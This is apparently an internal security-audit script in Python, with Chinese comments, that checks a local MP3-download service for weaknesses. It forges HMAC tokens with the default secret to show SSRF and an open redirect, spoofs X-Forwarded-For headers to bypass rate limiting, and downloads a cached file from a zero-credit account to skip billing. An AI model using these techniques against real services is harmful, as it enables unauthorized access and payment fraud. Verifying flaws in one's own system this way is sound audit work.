"""安全验证脚本：只读探测，不修改业务数据。"""
import base64, hashlib, hmac, json, os, sqlite3, sys, time

import requests

BASE = "http://127.0.0.1:9080"
DB = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "storage", "mp3dl.db")


def b64(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def forge(url, secret="mp3dl-dev-secret-change-me"):
    payload = {"u": url, "n": "probe", "s": "probe", "p": "probe", "e": int(time.time()) + 600}
    raw = b64(json.dumps(payload, ensure_ascii=False, separators=(",", ":")).encode())
    sig = b64(hmac.new(secret.encode(), raw.encode(), hashlib.sha256).digest())[:32]
    return f"{raw}.{sig}"


print("=" * 70)
print("[1] 未登录访问 /api/cover 伪造 token（默认密钥）-> SSRF")
token = forge("http://127.0.0.1:9080/api/platforms")
r = requests.get(f"{BASE}/api/cover/{token}", timeout=15)
print("    HTTP", r.status_code, "| content-type:", r.headers.get("content-type"),
      "| 长度:", len(r.content))
print("    回显前 120 字节:", r.content[:120])

print("=" * 70)
print("[2] 未登录访问 /api/dl 伪造 token -> 开放重定向")
token2 = forge("http://127.0.0.1:9080/admin")
r2 = requests.get(f"{BASE}/api/dl/{token2}", allow_redirects=False, timeout=10)
print("    HTTP", r2.status_code, "| 未登录应 401，实际:", r2.status_code,
      "| Location:", r2.headers.get("Location"))

print("=" * 70)
print("[3] X-Forwarded-For 伪造 -> 限流绕过（同一 IP 打满 25 次 vs 每次换 IP）")
same = []
for i in range(25):
    rr = requests.post(f"{BASE}/api/playlist/parse", json={"url": ""},
                       headers={"X-Forwarded-For": "198.51.100.7"}, timeout=10)
    same.append(rr.status_code)
print("    固定 XFF 25 次:", {c: same.count(c) for c in set(same)}, "（出现 429 说明生效）")

rot = []
for i in range(25):
    rr = requests.post(f"{BASE}/api/playlist/parse", json={"url": ""},
                       headers={"X-Forwarded-For": f"198.51.100.{100 + i}"}, timeout=10)
    rot.append(rr.status_code)
print("    轮换 XFF 25 次:", {c: rot.count(c) for c in set(rot)}, "（全 400 = 限流被绕过）")

print("=" * 70)
print("[4] 零积分新号直接拉缓存文件（绕过计费）")
s = requests.Session()
email = f"secaudit{int(time.time())}@example.com"
r3 = s.post(f"{BASE}/api/auth/register", json={"email": email, "password": "123456"},
            headers={"X-Forwarded-For": "203.0.113.200"}, timeout=15)
print("    注册:", r3.status_code, r3.json().get("user", {}).get("email"))
w = r3.json().get("user", {}).get("wallet", {})
print("    新号钱包: 积分", w.get("credits"), "| 今日免费", w.get("free_left"))

conn = sqlite3.connect(DB)
fid = conn.execute("SELECT id FROM files ORDER BY size DESC LIMIT 1").fetchone()[0]
print("    目标 file_id:", fid)
r4 = s.get(f"{BASE}/api/files/{fid}", timeout=60)
print("    下载结果: HTTP", r4.status_code, "| 收到字节:", len(r4.content),
      "| Content-Disposition:", (r4.headers.get("Content-Disposition") or "")[:70])

me = s.get(f"{BASE}/api/auth/me", timeout=15).json()["user"]
print("    下载后钱包: 积分", me["wallet"]["credits"], "| 今日免费剩余", me["wallet"]["free_left"])
print("    => 免费额度未变、积分未扣，但拿到了完整文件" if me["wallet"]["free_left"] == 10 else "    => 额度有变化")

print("=" * 70)
print("[5] 同一笔 charge 重复复用（批量降级接口）")
rows = conn.execute("SELECT COUNT(*) FROM charges").fetchone()[0]
print("    charges 行数:", rows)
print("=" * 70)
